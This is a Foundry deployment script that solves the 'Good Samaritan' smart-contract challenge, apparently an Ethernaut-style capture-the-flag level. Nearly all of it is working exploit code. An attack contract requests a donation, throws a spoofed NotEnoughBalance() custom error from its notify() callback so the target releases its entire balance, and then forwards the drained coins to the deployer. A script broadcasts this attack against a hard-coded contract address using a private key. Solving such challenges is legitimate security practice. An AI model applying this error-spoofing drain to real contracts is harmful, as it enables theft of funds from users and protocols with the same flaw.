
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GoodSamaritan.sol";

/*
    This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.
    Would you be able to drain all the balance from his Wallet?

    Things that might help:
        Solidity Custom Errors

    Solution:
    1. Create a contract that calls requestDonation() on the Good Samaritan contract
    2. This contract throws a custom revert inside notify()
    3. The custom revert triggers the Good Samaritan contract to send the remaining balance
 */
contract GoodSamaritanAttack {
    // Throw custom error NotEnoughBalance() so that the GoodSamaritan contract sends its remaining balance

    error NotEnoughBalance();

    constructor(GoodSamaritan _goodSamaritan, Coin _coin) {
        _goodSamaritan.requestDonation();
        require(_coin.balances(address(_goodSamaritan)) == 0);
        _coin.transfer(msg.sender, _coin.balances(address(this)));
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
contract GoodSamaritanSolution is Script {

    GoodSamaritan goodSamaritan = GoodSamaritan(0x466Ba35B0ee8a31c54fAEEbFCAE8F9BdC852FCEa);
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new GoodSamaritanAttack(goodSamaritan, goodSamaritan.coin());
        vm.stopBroadcast();
    }
}